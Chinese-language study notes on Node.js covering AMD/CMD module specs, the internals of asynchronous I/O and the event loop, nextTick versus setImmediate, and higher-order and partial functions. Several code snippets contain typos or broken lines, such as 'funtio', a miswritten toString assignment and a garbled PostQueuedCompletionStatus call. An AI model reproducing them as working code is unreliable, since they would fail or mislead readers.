<h2 id="局域NPM-暂略"><a href="#局域NPM-暂略" class="headerlink" title="局域NPM ???暂略"></a>局域NPM ???暂略</h2><h2 id="NPM潜在问题"><a href="#NPM潜在问题" class="headerlink" title="NPM潜在问题"></a>NPM潜在问题</h2><ol>
<li>每个人都可以分享包到平台上，NPM平台上包的质量良莠不齐。<br>判断参考：<br>1.npm首页上的依赖榜<br>2.github项目的观察者数量、分支数量<br>3.包的测试用例和文档状况</li>
<li>Node代码可以运行在服务器端，需要考虑安全问题</li>
</ol>
<h2 id="前后端共用模块"><a href="#前后端共用模块" class="headerlink" title="前后端共用模块"></a>前后端共用模块</h2><p>JavaScript在Node出现之后，比别的编程语言多了一项优势，那就是一些模块可以在前后端实现共用，这是因为很多API在各个宿主环境下都提供。但是在实际情况中，前后端的环境是略有差别的</p>
<h2 id="模块的侧重点"><a href="#模块的侧重点" class="headerlink" title="模块的侧重点"></a>模块的侧重点</h2><p>浏览器端的JavaScript需要经历从同一个服务器端分发到多个客户端执行，而服务器端JavaScript则是相同的代码需要多次执行。前者的瓶颈在于带宽，后者的瓶颈在于CPU和内存等资源。前者需要通过网络加载代码，后者从磁盘中加载，两者的加载速度不在一个数量级上。</p>
<p>纵观Node的模块引入过程，几乎都是同步的。尽管与Node强调异步的行为有些相反，但它是合理地。但是如果前端模块也采用同步的方式引入，那么会在用户体验上造成很大的问题。UI在初始化过程中需要花费很多时间来等待脚本加载完成。</p>
<p>CommonJS为后端制定的规范并不完全适合前端的应用场景。AMD规范最终在前端应用场景中胜出，它全称Asynchronous Module Definition,即是“异步模块定义”，除此之外还有玉伯定义的CMD规范。</p>
<h2 id="AMD规范"><a href="#AMD规范" class="headerlink" title="AMD规范"></a>AMD规范</h2><p>AMD规范是CommonJS模块规范的一个延伸，它的模块定义如下：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">define(id?, dependencies?, factory);</span><br></pre></td></tr></table></figure></p>
<p>它的模块id和依赖是可选的，与Node模块相似的地方在于factory的内容就是实际代码的内容。<br>简单例子<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">define(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> exports = &#123;&#125;;</span><br><span class="line">  exports.sayHello = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    alert(<span class="string">"hello"</span> + <span class="built_in">module</span>.id);</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">return</span> exports;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p>
<p>不同之处在于AMD模块需要用define来明确定义一个模块，而Node实现中是隐式包装的，它们的目的是进行作用域隔离，仅在需要的时候被引入，避免掉过去那种通过全局变量或者全局命名空间的方式，以免变量污染和不小心被修改。另一个区别则是内容需要通过返回的方式实现导出。</p>
<h2 id="CMD规范"><a href="#CMD规范" class="headerlink" title="CMD规范"></a>CMD规范</h2><p>CMD与AMD规范的主要区别在于定义模块和依赖引入的部分。AMD需要再声明模块的时候指定所有的依赖，通过形参传递依赖到模块内容中：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">define([<span class="string">'dep1'</span>, <span class="string">'dep2'</span>], <span class="function"><span class="keyword">function</span> (<span class="params">dep1, dep2</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;&#125;;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p>
<p>与AMD模块规范相比，CMD模块更接近于Node对CommonJS规范的定义<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">define(factory);</span><br></pre></td></tr></table></figure></p>
<p>在依赖部分，CMD支持动态引入<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">define(<span class="function"><span class="keyword">function</span>(<span class="params">require, exports, module</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// The module code goes here</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p>
<p>require、exports和module通过形参传递给模块，在需要依赖模块时，随时调用require()引入即可。</p>
<h2 id="兼容多种模块规范"><a href="#兼容多种模块规范" class="headerlink" title="兼容多种模块规范"></a>兼容多种模块规范</h2><p>为了让同一个模块可以运行在前后端，在写作过程中需要考虑兼容前端也实现了模块规范的环境。为了保持前后端的一致性，类库开发者需要将类库代码包装在一个闭包内。以下代码演示了如何将hello()方法定义到不同的运行环境中，它能够兼容Node、AMD、CMD以及常见的浏览器环境中：<br><img src="https://mfaying.github.io/static/images/node/15.jpg" alt="avatar"></p>
<h1 id="异步I-O"><a href="#异步I-O" class="headerlink" title="异步I/O"></a>异步I/O</h1><p>在众多高级语言或运行平台中，将异步作为主要编程方式和设计理念的，Node是首个。<br>伴随着异步I/O的还有事件驱动和单线程，它们构成Node的基调。</p>
<h2 id="为什么要异步I-O"><a href="#为什么要异步I-O" class="headerlink" title="为什么要异步I/O"></a>为什么要异步I/O</h2><p>在跨网络的结构下，并发已经是现代编程中的标配了。具体到实处，则可以从用户体验和资源分配这两个方面说起。</p>
<h2 id="用户体验"><a href="#用户体验" class="headerlink" title="用户体验"></a>用户体验</h2><p>提高响应速度，一个资源的获取不会阻塞另一个资源。</p>
<p>下表列出了从CPU一级缓存到网络的数据访问所需要的开销。<br><img src="https://mfaying.github.io/static/images/node/16.jpg" alt="avatar"></p>
<p>I/O是昂贵的，分布式I/O是更昂贵的。</p>
<h2 id="资源分配"><a href="#资源分配" class="headerlink" title="资源分配"></a>资源分配</h2><p>计算机在发展过程中将组件进行了抽象，分为I/O设备和计算设备。<br>假设业务场景中有一组互不相关的任务需要完成，现在的主流方法有以下两种<br>1.单线程串行依次执行<br>2.多线程并行完成<br>如果创建多线程的开销小于并行执行，那么多线程的方式是首选。多线程的代价在于创建线程和执行期线程上下文切换的开销较大。另外，在复杂的业务中，多线程编程经常面临锁、状态同步等问题。但是多线程在多核CPU上能够有效提升CPU的利用率。</p>
<p>单线程串行执行易于表达，缺点在于性能，任意一个略慢的任务都会导致后续执行代码被阻塞，在计算机资源中，通常I/O与CPU计算之间是可以并行进行的。但是同步编程模型导致的问题是，I/O的进行会让后续任务等待，这造成资源不能被更好的利用。</p>
<p>操作系统会将CPU的时间片分配给其余进程，以公平而有效地利用资源。基于这一点，有的服务器为了提升响应能力，会通过启动多个工作进程来为更多的用户服务。但是对于这一组任务而言，它无法分发任务到多个进程上，所以依然无法高效利用资源，结束所有任务所需的时间将会较长。这种模式类似于加三倍服务器，达到占用更多资源来提升服务速度，它并没有真正改善问题。</p>
<p>添加硬件资源是一种提升服务质量的方式，但它不是唯一的方式。</p>
<p>Node给出了它的方案：利用单线程，远离多线程死锁、状态同步等问题；利用异步I/O,让单线程远离阻塞，以更好地使用CPU.</p>
<p>为了弥补单线程无法利用多核CPU的缺点，Node提供了类似前端浏览器中Web Workers的子进程，该子进程通过工作进程高效利用CPU和I/O。</p>
<p>异步I/O的调用示意图如下：<br><img src="https://mfaying.github.io/static/images/node/17.jpg" alt="avatar"></p>
<h2 id="异步I-O实现现状"><a href="#异步I-O实现现状" class="headerlink" title="异步I/O实现现状"></a>异步I/O实现现状</h2><p>下面我们来看看操作系统对异步I/O实现的支持状况</p>
<h2 id="异步I-O和非阻塞I-O"><a href="#异步I-O和非阻塞I-O" class="headerlink" title="异步I/O和非阻塞I/O"></a>异步I/O和非阻塞I/O</h2><p>操作系统内核对于I/O只有两种方式：阻塞与非阻塞。在调用阻塞I/O一定要等到系统内核层面完成所有操作后，调用才结束。<br><img src="https://mfaying.github.io/static/images/node/18.jpg" alt="avatar"></p>
<p>阻塞I/O造成CPU等待I/O，浪费等待时间。为了提高性能，内核提供了非阻塞I/O。非阻塞I/O跟阻塞I/O的差别为调用之后会立即返回<br><img src="https://mfaying.github.io/static/images/node/19.jpg" alt="avatar"></p>
<p>图注释的文字（非正文）：操作系统对计算机进行了抽象，将所有输入输出设备抽象为文件。内核在进行文件I/O操作时，通过文件描述符进行管理，而文件描述符类似于应用程序与系统内核之间的凭证。应用程序如果需要进行I/O调用，需要先打开文件描述符，然后再根据文件描述符去实现文件的数据读写。此处非阻塞I/O与阻塞I/O的区别在于阻塞I/O完成整个获取数据的过程，而非阻塞I/O则不带数据直接返回，要获取数据，还需要通过文件描述符再次读取。</p>
<p>非阻塞I/O返回之后，CPU的时间片可以用来处理其他事务，性能提升是明显的。</p>
<p>但是由于完整I/O并没有完成，立即返回的并不是业务层期望的数据，而仅仅是当前调用的状态。为了获取完整的数据，应用程序需要重复调用I/O操作判断是否完成技术——轮询。</p>
<p>非阻塞带来的麻烦是需要轮询确认是否完全完成数据获取，它会让CPU处理状态判断，是对CPU资源的浪费。</p>
<p>轮询技术的演进：<br>1.read。 它是最原始、性能最低的一种，通过重复调用来检查I/O的状态来完成完整数据的读取。在得到最终数据前，CPU一直耗用在等待上。<br><img src="https://mfaying.github.io/static/images/node/20.jpg" alt="avatar"></p>
<p>2.select。它是在read的基础上改进的一种方案，通过对文件描述符上的事件状态来进行判断。<br><img src="https://mfaying.github.io/static/images/node/21.jpg" alt="avatar"><br><br>select轮询具有一个较弱的限制，那就是由于它采用一个1024长度的数组来存储状态，所以它最多可以同时检查1024个文件描述符。</p>
<p>3.poll。该方案较select有所改进，采用链表的方式避免数组长度的限制，其次它能避免不需要的检查。但是当文件描述符较多时，它的性能还是十分低下的。<br><img src="https://mfaying.github.io/static/images/node/22.jpg" alt="avatar"></p>
<p>4.epoll。该方案是Linux下效率最高的I/O事件通知机制，在进入轮询的时候如果没有检查到I/O事件，将会进行休眠，直到事件方式将它唤醒。它是真实利用了事件通知、执行回调的方式，而不是遍历查询，所以不会浪费CPU。<br><img src="https://mfaying.github.io/static/images/node/23.jpg" alt="avatar"></p>
<p>5.kqueue 该方案的实现方式与epoll类似，不过它仅在FreeBSD系统下存在。</p>
<p>轮询技术满足了非阻塞I/O确保获取完整数据的需求，但是对于应用程序而言，它仍然只能算是一种同步，因为应用程序仍然需要等待I/O完全返回，依旧花费了很多时间来等待。等待期间，CPU要么用于遍历文件描述符的状态，要么用于休眠等待事件发生。结论是它还不够好。</p>
<p>理想的非阻塞异步I/O</p>
<p>epoll休眠期间CPU几乎是闲置的，对于当前线程而言利用率不够。</p>
<p>我们期望的完美的异步I/O应该是应用程序发起非阻塞调用，无须通过遍历或者事件唤醒等方式轮询，可以直接处理下一个任务，只需在I/O完成后通过信号或回调将数据传递给应用程序。<br><img src="https://mfaying.github.io/static/images/node/24.jpg" alt="avatar"></p>
<p>幸运的是，在Linux下存在这样一种方式，它原生提供的一种异步I/O方式（AIO）就是通过信号或回调来传递数据的。<br>但不幸运的是，只有Linux下有，而且它还有缺陷——AIO仅支持内核I/O中的O_DIRECT方式读取，导致无法利用系统缓存。</p>
<h2 id="现实中的异步I-O"><a href="#现实中的异步I-O" class="headerlink" title="现实中的异步I/O"></a>现实中的异步I/O</h2><p>前面我们将场景限定在了单线程的状况下，多线程的方式可以通过让部分线程进行阻塞I/O或者非阻塞I/O加轮询技术来完成数据获取，让一个线程进行计算处理，通过线程之间的通信将I/O得到的数据进行传递，这就实现了异步I/O（尽管它是模拟的）<br><img src="https://mfaying.github.io/static/images/node/25.jpg" alt="avatar"></p>
<p>glibc的AIO便是典型，但它存在很多缺陷，不推荐采用。libeio实际上依然是采用线程池与阻塞I/O模拟异步I/O。在Node v0.9.3中，自行实现了线程池来完成异步I/O.</p>
<p>windows下的IOCP，在某种程度上提供了理想的异步I/O，但是它的内部其实仍然是线程池原理，不同之处在于这些线程池由系统内核接手管理。</p>
<p>由于Windows平台和<em>nix平台的差异，Node提供了libuv作为抽象封装层，使得所有平台兼容性的判断都由这一层来完成。<br><img src="https://mfaying.github.io/static/images/node/26.jpg" alt="avatar"><br>这里I/O不仅仅只限于磁盘文件的读写。</em>nix将计算机抽象了一番，磁盘文件、硬件、套接字等几乎所有计算机资源都被抽象为了文件。另外Node是单线程的，仅仅只是JavaScript执行在单线程中。无论是*nix还是Windows平台，内部完成I/O任务的另有线程池。</p>
<h2 id="Node的异步I-O"><a href="#Node的异步I-O" class="headerlink" title="Node的异步I/O"></a>Node的异步I/O</h2><p>介绍完系统对异步I/O的支持后，我们将继续介绍Node是如何实现异步I/O的。这里我们除了介绍异步I/O的实现外，还将讨论Node的执行模型。完成整个异步I/O环节的有事件循环、观察者和请求对象等。</p>
<h2 id="事件循环"><a href="#事件循环" class="headerlink" title="事件循环"></a>事件循环</h2><p>我们先介绍一下Node自身的执行模型——事件循环，正是它使得回调函数十分普通。</p>
<p>在进程启动时，Node会创建一个类似于while(true)的循环，每执行一次循环过程我们称为Tick。每个Tick的过程就是查看是否有事件待处理，如果有，就取出事件及其相关的回调函数。如果存在关联的回调函数，就执行它们。然后进入下个循环，如果不再有事件处理，就退出进程。<br><img src="https://mfaying.github.io/static/images/node/27.jpg" alt="avatar"></p>
<h2 id="观察者"><a href="#观察者" class="headerlink" title="观察者"></a>观察者</h2><p>在每个Tick的过程中，如何判断是否有事件需要处理呢？每个事件循环中有一个或者多个观察者，而判断是否有事件要处理的过程就是向这些观察者询问是否有要处理的事件。</p>
<p>浏览器采用了类似的机制。事件可能来自用户的点击或者加载某些文件时产生，而这些产生的事件都有对应的观察者。在Node中，事件主要来源于网路请求、文件I/O等，这些事件对应的观察者有文件I/O观察者、网路I/O观察者等。观察者将事件进行了分类。<br>事件循环是一个典型的生产者/消费者模型，异步I/O、网络请求等则是事件的生产者，源源不断为Node提供不同类型的事件，这些事件被传递到对应的观察者那里，事件循环则从观察者那里取出事件并处理。</p>
<p>在Window下，这个循环基于IOCP创建，而在*nix下则基于多线程创建。</p>
<h2 id="请求对象"><a href="#请求对象" class="headerlink" title="请求对象"></a>请求对象</h2><p>我们将通过解释Windows下一步I/O（利用IOCP实现）的简单例子来探寻从JavaScript代码到内核之间都发生了什么</p>
<p>从JavaScript发起调用到内核执行完I/O操作，回调函数执行的过渡过程中，存在一种中间产物，它叫请求对象</p>
<p>我们以fs.open()方法为例：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">fs.open = <span class="function"><span class="keyword">function</span> (<span class="params">path, flags, mode, callback</span>) </span>&#123;</span><br><span class="line">  binding.open(pathModule._makeLong(path),stringToFlags(flags),mode,callback);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>fs.open的作用是根据指定路径和参数去打开一个文件，从而得到一个文件描述符，这是后续所有I/O操作的初始操作。从前面的代码中可以看到，JavaScript层面的代码通过调用C++核心模块进行下层的操作<br><img src="https://mfaying.github.io/static/images/node/28.jpg" alt="avatar"><br>从JavaScript调用Node的核心模块，核心模块调用C++内建模块，内建模块通过libuv进行系统调用。在uv_fs_open()的调用过程中，我们创建了一个FSReqWrap请求对象。从JavaScript层传入的参数和当前方法都被封装在这个请求对象中，其中我们最为关注的回调函数则被设置在这个对象的oncomplete_sym属性上：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">req_wrap-&gt;object_-&gt;Set(oncomplete_sym, callback);</span><br></pre></td></tr></table></figure></p>
<p>对象包装完毕后，在Windows下，则调用QueueUserWorkItem()方法将这个FSReqWrap对象推入线程池中等待执行。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">QueueUserWorkItem(&amp;uv_fs_thread_proc,req,WT_EXECUTEDEFAULT)</span><br></pre></td></tr></table></figure></p>
<p>第一个参数是要执行方法的引用，第二个参数是uv_fs_thread_proc运行时所需要的参数；第三个参数是执行的标志。当线程池中有可用线程时，我们会调用uv_fs_thread_proc，uv_fs_thread_proc会根据传入参数的类型调用相应的底层函数。以uv_fs_open为例，实际上调用fs_open()方法。</p>
<p>至此，JavaScript调用立即返回，javascript线程可以继续执行当前任务的后续操作。当前的I/O操作在线程池中等待执行，不管它是否阻塞I/O，都不会影响到JavaScript线程的后续执行。</p>
<p>请求对象重要的中间产物，所有的状态都保存在这个对象中，包括送入线程池等待执行以及I/O操作完毕后的回调处理。</p>
<h2 id="执行回调"><a href="#执行回调" class="headerlink" title="执行回调"></a>执行回调</h2><p>线程池的I/O操作调用完毕之后，会将获取的结果存储在req-&gt;result属性上，然后调用PostQueuedCompletionStatus()通知IOCP,告知当前对象操作已经完成：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">PostQueuedCompletionStatus(loop)-&gt;locp,<span class="number">0</span>,<span class="number">0</span>,&amp;<span class="function">(<span class="params">(req</span>)=&gt;</span>overlapped))</span><br></pre></td></tr></table></figure></p>
<p>PostQueuedCompletionStatus方法的作用是向IOCP提交执行状态，并将线程归还线程池。可以通过GetQueuedCompletionStatus提取提交的状态。<br>在每次Tick的执行中，它会调用IOCP相关的GetQueuedCompletionStatus方法检查线程池中是否有执行完的请求，如果有，会将请求对象加入到I/O观察者的队列中，然后将其当做事件处理。<br>I/O观察者回调函数的行为就是取出请求对象的result属性作为参数，取出oncomplete_sym属性作为方法，然后调用执行，以此达到调用JavaScript中传入的回调函数的目的。<br>至此，整个异步I/O的流程完全结束<br><img src="https://mfaying.github.io/static/images/node/29.jpg" alt="avatar"><br>事件循环、观察者、请求对象、I/O线程池这四者共同构成了Node异步I/O模型的基本要素。</p>
<h2 id="非I-O的异步API"><a href="#非I-O的异步API" class="headerlink" title="非I/O的异步API"></a>非I/O的异步API</h2><p>Node中还存在与I/O无关的异步API</p>
<h2 id="定时器"><a href="#定时器" class="headerlink" title="定时器"></a>定时器</h2><p>setTimeout()和setInterval()与浏览器中的API是一致的，分别用于单次和多次定时执行任务。调用它们创建的定时器会被插入到定时器观察者内部的一个红黑树中，每次Tick执行时，会从该红黑树中迭代取出定时器对象，检查是否超过定时时间，如果超过，就形成一个事件，它的回调函数将立即执行。</p>
<p>下图主要是setTimeout的行为，setInterval的区别是后者是重复性的检测和执行。</p>
<p>定时器并非精确的。尽管事件循环十分快，但是如果某一次循环占用的时间较多，那么下次循环时，它也许已经超时很久了。<br><img src="https://mfaying.github.io/static/images/node/30.jpg" alt="avatar"></p>
<h2 id="process-nextTick"><a href="#process-nextTick" class="headerlink" title="process.nextTick()"></a>process.nextTick()</h2><p>很多人也许为了立即异步执行一个任务，会这样调用:<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">setTimeout(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="comment">// TODO</span></span><br><span class="line">&#125;, <span class="number">0</span>);</span><br></pre></td></tr></table></figure></p>
<p>由于事件循环自身的特点，定时器的精确度不够。而事实上，采用定时器需要动用红黑树，创建定时器对象和迭代等操作，而setTimeout(fn, 0)的方式较为浪费性能。process.nextTick较为轻量：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">process.nextTick = <span class="function"><span class="keyword">function</span>(<span class="params">callback</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (process._exiting) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (tickDepth &gt;= process.maxTickDepth) </span><br><span class="line">    maxTickWarn();</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">var</span> tock = &#123; <span class="attr">callback</span>: callback &#125;;</span><br><span class="line">  <span class="keyword">if</span> (process.domain)  tock.domain = process.domain;</span><br><span class="line">  nextTickQueue.push(tock);</span><br><span class="line">  <span class="keyword">if</span> (nextTickQueue.length) &#123;</span><br><span class="line">    process._needTickCallback();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>每次调用process.nextTick方法，只会将回调函数放入队列中，在下一轮Tick时取出执行定时器中采用红黑树的操作时间复杂度O(lg(n)),nextTick()的时间复杂度为O(1)</p>
<h2 id="setImmediate"><a href="#setImmediate" class="headerlink" title="setImmediate()"></a>setImmediate()</h2><p>相关代码：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">setImmediate(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'延迟执行'</span>);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'正常执行'</span>);</span><br></pre></td></tr></table></figure></p>
<p>和nextTick的区别<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">process.nextTick(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'nextTick延迟执行'</span>);</span><br><span class="line">&#125;);</span><br><span class="line">setImmediate(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'setImmediate延迟执行'</span>);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'正常执行'</span>);</span><br></pre></td></tr></table></figure></p>
<p>结果如下：<br>正常执行<br>nextTick延迟执行<br>setImmediate延迟执行</p>
<p>原因在于事件循环对观察者的检查是有先后顺序的，process.nextTick()属于idle观察者，setImmediate()属于check观察者。在每一轮循环检查中，idle观察者先于I/O观察者，I/O观察者先于check观察者</p>
<p>在具体实现上，process.nextTick的回调函数保存在一个数组中，setImmediate()的结果则是保存在链表中。在行为上，process.nextTick在每轮循环中会将数组中的回调函数全部执行，而setImmediate在每轮循环中执行链表中的一个回调函数<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">process.nextTick(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'nextTick延迟执行1'</span>);</span><br><span class="line">&#125;);</span><br><span class="line">process.nextTick(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'nextTick延迟执行2'</span>);</span><br><span class="line">&#125;);</span><br><span class="line">setImmediate(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'setImmediate延迟执行1'</span>);</span><br><span class="line">  process.nextTick(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'强势插入'</span>);</span><br><span class="line">&#125;);</span><br><span class="line">&#125;);</span><br><span class="line">setImmediate(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'setImmediate延迟执行2'</span>);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'正常执行'</span>);</span><br></pre></td></tr></table></figure></p>
<p>正常执行<br>nextTick延迟执行1<br>nextTick延迟执行2<br>setImmediate延迟执行1<br>强势插入<br>setImmediate延迟执行2</p>
<h2 id="事件驱动与高性能服务器"><a href="#事件驱动与高性能服务器" class="headerlink" title="事件驱动与高性能服务器"></a>事件驱动与高性能服务器</h2><p>异步的实现原理也基本勾勒出了事件驱动的实质，即通过主循环加事件触发的方式来运行程序。</p>
<p>利用Node构建Web服务器，正是在这样一个基础上实现的。<br><img src="https://mfaying.github.io/static/images/node/31.jpg" alt="avatar"></p>
<p>几种经典服务器模型的优缺点</p>
<ol>
<li>同步式 对于同步式的服务，一次只能处理一个请求，并且其余请求都处于等待状态</li>
<li>每进程/每请求 为每个请求启动一个进程，这样可以处理多个请求，但是它不具备扩展性，因为系统资源只有那么多</li>
<li>每线程/每请求 为每个请求启动一个线程来处理。尽管线程比进程要轻量，但是由于每个线程都占用一定内存，当大并发请求到来时，内存将会很快用光，导致服务器缓慢。</li>
</ol>
<p>Node通过事件驱动的方式处理请求，无需为每个请求创建额外的线程，可以节省掉创建线程和销毁线程的开销，同时操作系统在调度任务时因为线程较少，上下文切换的代价很低。这使得服务器能够有条不紊地处理请求，即使在大量连接的情况下，也不受线程上下文切换开销的影响，这是Node高性能的原因之一。</p>
<h1 id="异步编程"><a href="#异步编程" class="headerlink" title="异步编程"></a>异步编程</h1><h2 id="函数式编程"><a href="#函数式编程" class="headerlink" title="函数式编程"></a>函数式编程</h2><p>在开始异步编程之前，先得知晓JavaScript现今的回调函数和深层嵌套的来龙去脉。</p>
<h2 id="高阶函数"><a href="#高阶函数" class="headerlink" title="高阶函数"></a>高阶函数</h2><p>高阶函数是可以将函数作为参数，或是将函数作为返回值得函数<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">funtio foo(x) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> x;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>对于程序编写，高阶函数除了普通意义的函数调用返回外，还形成了一种后续传递风格的结果接收方式。后续传递风格的程序编写将函数的业务重点从返回值转移到了回调函数中：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params">x, bar</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> bar(x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>对于相同的foo函数，传入的bar参数不同，则可以得到不同的结果.<br>结合Node提供的最基本的事件模块可以看到，事件的处理方式正式基于高阶函数的特性来完成的。在自定义事件实例中，通过为相同事件注册不同的回调函数，可以很灵活地处理业务逻辑<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> emitter = <span class="keyword">new</span> events.EventEmitter();</span><br><span class="line">emitter.on(<span class="string">'event_foo'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="comment">// TODO</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p>
<h2 id="偏函数用法"><a href="#偏函数用法" class="headerlink" title="偏函数用法"></a>偏函数用法</h2><p>偏函数用法是指创建一个调用另外一个部分——参数或变量已经预置的函数——的函数的用法。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> toSring = <span class="built_in">Object</span>.prototype.toString();</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> isString = <span class="function"><span class="keyword">function</span> (<span class="params">obj</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> toString.call(obj) == <span class="string">'[object String]'</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> isFunction = <span class="function"><span class="keyword">function</span> (<span class="params">obj</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> toString.call(obj) == <span class="string">'[object Function]'</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
<p>这段代码存在的问题是，我们需要重复定义一些相似的函数，如果有更多的isXXX()，就会出现更多的冗余代码。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> isType = <span class="function"><span class="keyword">function</span> (<span class="params">type</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> (<span class="params">obj</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> toString.call(obj) == <span class="string">'[object '</span> + type + <span class="string">']'</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> isString = isType(<span class="string">"String"</span>);</span><br><span class="line"><span class="keyword">var</span> isFunction = isType(<span class="string">"Function"</span>);</span><br></pre></td></tr></table></figure></p>
<p>这种通过指定部分参数来产生一个新的定制函数的形式就是偏函数。</p>
<h2 id="异步编程的优势与难点"><a href="#异步编程的优势与难点" class="headerlink" title="异步编程的优势与难点"></a>异步编程的优势与难点</h2><h2 id="优势"><a href="#优势" class="headerlink" title="优势"></a>优势</h2><p>Node带来的最大特性莫过于基于事件驱动的非阻塞I/O模型，使CPU与I/O并不相互依赖等待，让资源得到更好的利用。<br><img src="https://mfaying.github.io/static/images/node/32.jpg" alt="avatar"></p>
<p><img src="https://mfaying.github.io/static/images/node/33.jpg" alt="avatar"></p>
<h2 id="难点"><a href="#难点" class="headerlink" title="难点"></a>难点</h2><p>1.异常处理</p>
<p>过去我们处理异常时，通常使用类Java的try/catch/final进行异常捕获，<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  <span class="built_in">JSON</span>.parse(json);</span><br><span class="line">&#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">  <span class="comment">// TODO</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>异步I/O的实现主要包含两个阶段，提交请求和处理结果。这两个阶段有事件循环调度，两者彼此不关联。异步方法则通常在第一个阶段提交请求后立即返回，因为异常并不一定发生在这个阶段，try/catch的功效在此处不会发挥任何作用:<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="keyword">async</span> = <span class="function"><span class="keyword">function</span> (<span class="params">callback</span>) </span>&#123;</span><br><span class="line">  process.nextTick(callback);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  <span class="keyword">async</span>(callback);</span><br><span class="line">&#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">  <span class="comment">// TODO</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>调用async()方法后，callback被存放起来，直到下一个事件循环（Tick）才会取出来执行。尝试对异步方法try/catch操作只能捕获当次事件循环内的异常，对callback执行时抛出的异常将无能为力。</p>
